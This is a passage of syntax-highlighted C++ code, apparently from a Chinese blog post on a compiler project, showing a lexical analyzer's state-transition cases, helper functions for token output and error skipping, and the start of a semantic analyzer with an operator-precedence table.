可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123; <span class="comment">// 状态转移-&gt;18 正常实数</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">3</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">17</span>:&#123;   <span class="comment">// 标识符 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>() || <span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;_&#x27;</span>)&#123;  <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">17</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 获取标识符</span></span><br><span class="line">                            type = <span class="number">4</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">18</span>:&#123;   <span class="comment">// 真 实数 后可不跟数字 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123; <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;19 科学计数法  允许有: 3.e7 的写法</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 截取实数</span></span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">42</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; </span><br><span class="line">                    <span class="keyword">case</span> <span class="number">19</span>:&#123;   <span class="comment">// 科学计数法e 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;+&#x27;</span> || wd == <span class="string">&#x27;-&#x27;</span>)&#123;     <span class="comment">// 状态转移-&gt;25 科学计数法+-</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">25</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;      <span class="comment">// 状态转移-&gt;26 十进制整数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">26</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 出错啦</span></span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">20</span>:&#123;   <span class="comment">// 十六进制x 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">16</span>))&#123;   <span class="comment">// 状态转移-&gt;27 十六进制整数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">27</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">21</span>:&#123;   <span class="comment">// 二进制数b 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">2</span>))&#123;    <span class="comment">// 状态转移-&gt;28 二进制数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">28</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">22</span>:&#123;   <span class="comment">// 八进制数中态 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">8</span>))&#123;    <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">22</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;19 科学计数法e</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>)&#123;   <span class="comment">// 状态转移-&gt;18 当做十进制数处理的八进制小数(C++中自适应)</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">23</span>:&#123;   <span class="comment">// 单行注释符// 条件终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;\n&#x27;</span>)&#123;   <span class="comment">// 截取单行注释串</span></span><br><span class="line">                            type = <span class="number">5</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">23</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">24</span>:&#123;   <span class="comment">// 多行注释符/* 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;29 检测退出记号*/</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">29</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">24</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">25</span>:&#123;   <span class="comment">// 科学计数法+- 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;     <span class="comment">// 状态转移-&gt;26 十进制整数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">26</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">26</span>:&#123;   <span class="comment">// 十进制整数后终态 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;     <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">26</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">42</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">27</span>:&#123;   <span class="comment">// 十六进制整数后终态 十六进制不接受小数点</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">16</span>))&#123;   <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">27</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;19</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">28</span>:&#123;   <span class="comment">// 二进制数后终态</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">2</span>))&#123;</span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">28</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;</span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">29</span>:&#123;   <span class="comment">// 检测退出记号 */</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                            type = <span class="number">5</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; </span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>)&#123;     <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">29</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;    <span class="comment">// 状态转移-&gt;24</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">24</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(needOF &amp;&amp; !silence)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;==&gt; The output has been saved to the file: %s&quot;</span>, oFP.<span class="built_in">c_str</span>());   <span class="comment">// 保存文件</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">blankContinue</span><span class="params">()</span></span>&#123;    <span class="comment">// 跳过空白字符，考虑换行对正负加减的影响</span></span><br><span class="line">            <span class="keyword">if</span>(wd == <span class="string">&#x27;\n&#x27;</span>) cag = <span class="number">51</span>;     <span class="comment">// 对于大部分词元而言换行等价于分号 </span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">passError</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;   <span class="comment">// 跳过错误部分，不考虑错误部分引号的性质</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=n; i&lt;srcLen; i++)&#123;</span><br><span class="line">                wd = src[i];</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isDelimiter</span>() || <span class="built_in">isBlank</span>() || wd == <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                    <span class="built_in">outError</span>();</span><br><span class="line">                    <span class="keyword">return</span> i<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(wd == <span class="string">&#x27;:&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(src[i+<span class="number">1</span>]!=<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">                        <span class="built_in">outError</span>();</span><br><span class="line">                        <span class="keyword">return</span> i<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(src[i+<span class="number">1</span>]==<span class="string">&#x27;/&#x27;</span> || src[i+<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                        <span class="built_in">outError</span>();</span><br><span class="line">                        <span class="keyword">return</span> i<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">newStatus</span>(<span class="number">-1</span>);  <span class="comment">// 避免分界符被放入错误输出中</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> srcLen<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">outError</span><span class="params">()</span></span>&#123;     <span class="comment">// 错误报告</span></span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;Error with: %s\n&quot;</span>, words.<span class="built_in">c_str</span>());</span><br><span class="line">            <span class="built_in">newStatus</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">newStatus</span><span class="params">(<span class="type">int</span> _s)</span></span>&#123;  <span class="comment">// 更新状态</span></span><br><span class="line">            <span class="keyword">switch</span>(_s)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 为0则初始化状态</span></span><br><span class="line">                    status = <span class="number">0</span>;    <span class="comment">// 原始状态</span></span><br><span class="line">                    len = <span class="number">0</span>;</span><br><span class="line">                    words = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">-1</span>:   <span class="comment">// -1作为一个暂态，处理不需要状态实际转移的情况</span></span><br><span class="line">                    len += <span class="number">1</span>;</span><br><span class="line">                    words += wd;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:    <span class="comment">// 不为0就更新状态</span></span><br><span class="line">                    status = _s;</span><br><span class="line">                    len += <span class="number">1</span>;</span><br><span class="line">                    words += wd;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">output</span><span class="params">()</span></span>&#123;   <span class="comment">// 存储词元、输出、初始化</span></span><br><span class="line">            <span class="keyword">switch</span>(type)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">break</span>;      <span class="comment">// 关键字</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:    <span class="comment">// 运算符</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">20</span>; i&lt;<span class="number">33</span>; i++)</span><br><span class="line">                        <span class="keyword">if</span>(wordsTable[i] == words)&#123;</span><br><span class="line">                            cag = i+<span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;  <span class="comment">// 跳出for循环而非case</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="comment">// 出错啦</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">break</span>;      <span class="comment">// 常数</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:    <span class="comment">// 界符</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">50</span>; i&lt;<span class="number">56</span>; i++)</span><br><span class="line">                        <span class="keyword">if</span>(wordsTable[i] == words)&#123;</span><br><span class="line">                            cag = i+<span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// 出错啦</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:    <span class="comment">// 标识符</span></span><br><span class="line">                    cag = <span class="number">45</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:     <span class="comment">// 注释 无需输出与存储，初始化后退出</span></span><br><span class="line">                    <span class="built_in">newStatus</span>(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            wordsLen += <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;(%d)(%d,%s)\n&quot;</span>, wordsLen, cag, words.<span class="built_in">c_str</span>());</span><br><span class="line">            strV.<span class="built_in">push_back</span>(words);   <span class="comment">// 存储词元</span></span><br><span class="line">            typeV.<span class="built_in">push_back</span>(cag);   <span class="comment">// 存储词元</span></span><br><span class="line">            <span class="built_in">newStatus</span>(<span class="number">0</span>);   <span class="comment">// 初始化</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isBlank</span><span class="params">()</span><span class="type">const</span></span>&#123;    <span class="comment">// 检测空白字符</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">                <span class="keyword">if</span>(filt[i] == wd) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isDelimiter</span><span class="params">()</span><span class="type">const</span></span>&#123;    <span class="comment">// 判断是否是单字分界符</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">                <span class="keyword">if</span>(wd == delm[i]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isKeywords</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断关键字，返回种别码或0</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;keyWordsLen; i++)</span><br><span class="line">                <span class="keyword">if</span>(words == wordsTable[i]) <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isNumber</span><span class="params">(<span class="type">int</span> lim = <span class="number">10</span>)</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断数字</span></span><br><span class="line">            <span class="keyword">switch</span> (lim)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 除0以外的十进制数字</span></span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;9&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">10</span>:        <span class="comment">// 十进制</span></span><br><span class="line">                    <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;9&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;7&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;9&#x27;</span> || wd &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;f&#x27;</span> || wd &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;F&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isLowerLetter</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断大写字母</span></span><br><span class="line">            <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;a&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;z&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isUpperLetter</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断大写字母</span></span><br><span class="line">            <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;A&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;Z&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">printSplit</span><span class="params">(string text)</span></span>&#123;  <span class="comment">// 输出夹带文本的分割线</span></span><br><span class="line">            <span class="keyword">if</span>(silence==<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="type">const</span> <span class="type">int</span> aLen = <span class="number">60</span>;</span><br><span class="line">            <span class="type">int</span> _len = text.<span class="built_in">length</span>()+<span class="number">2</span>; <span class="comment">// 两侧留空</span></span><br><span class="line">            <span class="type">int</span> left = (aLen-_len)/<span class="number">2</span>, right = aLen - left - _len;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;left; i++) <span class="built_in">newPrintf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot; %s &quot;</span>, text.<span class="built_in">c_str</span>());</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;right; i++) <span class="built_in">newPrintf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">newPrintf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>&#123;   <span class="comment">// 重载自己的printf, 便于保存输出的内容, 参考: https://blog.csdn.net/weixin_51281362/article/details/125445742 | https://blog.csdn.net/wanruiou/article/details/115180466</span></span><br><span class="line">            <span class="keyword">if</span>(silence==<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">            va_list arg;    </span><br><span class="line">            <span class="built_in">va_start</span>(arg, fmt); <span class="comment">// 传入地址</span></span><br><span class="line">            <span class="built_in">vprintf</span>(fmt, arg); </span><br><span class="line">            <span class="keyword">if</span>(needOF)  <span class="comment">// 需要保存至文件</span></span><br><span class="line">                <span class="built_in">vfprintf</span>(oF, fmt, arg); <span class="comment">// 借助FILE将printf重定向至文件流, 参考: https://blog.csdn.net/LuyaoYing001/article/details/79750833</span></span><br><span class="line">            <span class="built_in">va_end</span>(arg);    <span class="comment">// 结束可变参数的获取</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getVL</span><span class="params">()</span><span class="type">const</span></span>&#123; <span class="keyword">return</span> typeV.<span class="built_in">size</span>(); &#125;    <span class="comment">// 数组长度</span></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">atTV</span><span class="params">(<span class="type">int</span> n)</span><span class="type">const</span></span>&#123; <span class="keyword">return</span> typeV[n]; &#125;    </span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">getTV</span><span class="params">()</span><span class="type">const</span></span>&#123; <span class="keyword">return</span> typeV; &#125;   </span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">getSV</span><span class="params">()</span><span class="type">const</span></span>&#123; <span class="keyword">return</span> strV; &#125;   </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> threshold=<span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getLen</span><span class="params">(T&amp; arr)</span></span>&#123; <span class="comment">// 快速获取数组长度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sizeof</span>(arr)/<span class="built_in">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Chain</span>&#123;   <span class="comment">// 记录TrueChain指针与FalseChain指针的结构体</span></span><br><span class="line">    <span class="type">int</span> tC; <span class="comment">// trueChain</span></span><br><span class="line">    <span class="type">int</span> fC; <span class="comment">// falseChain</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">semanticAnalyzer</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">const</span> <span class="type">int</span> opp[<span class="number">7</span>][<span class="number">7</span>]=&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">2</span>,<span class="number">0</span>&#125;;  <span class="comment">//operatorPriority</span></span><br><span class="line">        <span class="comment">//运算符顺序:&#x27;+&#x27;,&#x27;-&#x27;,&#x27;*&#x27;,&#x27;/&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;#&#x27; 1表示大于，0等于，-1小于,2非法</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">              + - * / ( ) #</span></span><br><span class="line"><span class="comment">            + &gt; &gt; &lt; &lt; &lt; &gt; 